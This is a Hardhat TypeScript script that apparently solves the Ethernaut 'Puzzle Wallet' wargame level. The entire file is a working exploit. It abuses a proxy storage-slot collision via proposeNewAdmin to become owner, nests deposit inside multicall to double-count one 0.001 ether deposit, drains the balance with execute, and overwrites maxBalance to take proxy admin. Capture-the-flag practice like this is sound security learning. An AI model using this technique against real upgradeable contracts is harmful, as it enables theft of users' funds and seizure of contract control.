import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers, waffle } from "hardhat";
import { PuzzleProxy, PuzzleProxy__factory, PuzzleWallet, PuzzleWallet__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0x067e8966cc4eb3FBeF464A8ac5E0c5D03C5843e8';
  const instance: PuzzleProxy = PuzzleProxy__factory.connect(deployedAddress, addr1);
  const puzzleWallet: PuzzleWallet = PuzzleWallet__factory.connect(deployedAddress, addr1);

  await (await instance.proposeNewAdmin(addr1.address)).wait(1)
  console.log(await instance.admin())
  console.log(await instance.pendingAdmin())
  console.log(await puzzleWallet.owner())
  console.log(await puzzleWallet.maxBalance())
  await (await puzzleWallet.addToWhitelist(addr1.address)).wait(1)

  console.log(await puzzleWallet.whitelisted(addr1.address))
  console.log(ethers.utils.formatEther(await waffle.provider.getBalance(deployedAddress)))
  const contractValue: BigNumber = ethers.utils.parseEther("0.001");
  const depositAbiData: string = puzzleWallet.interface.encodeFunctionData("deposit");
  const multicallAbiData: string = puzzleWallet.interface.encodeFunctionData("multicall", [[depositAbiData]]);
  await (await puzzleWallet.multicall([depositAbiData, multicallAbiData], { value: contractValue })).wait(1)

  console.log(ethers.utils.formatEther(await waffle.provider.getBalance(deployedAddress)))
  console.log(ethers.utils.formatEther(await puzzleWallet.balances(addr1.address)))

  await (await puzzleWallet.execute(addr1.address, contractValue.mul(2), ethers.constants.HashZero)).wait(1)
  await (await puzzleWallet.setMaxBalance(addr1.address)).wait(1)

  expect(await instance.admin()).to.be.eq(addr1.address)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
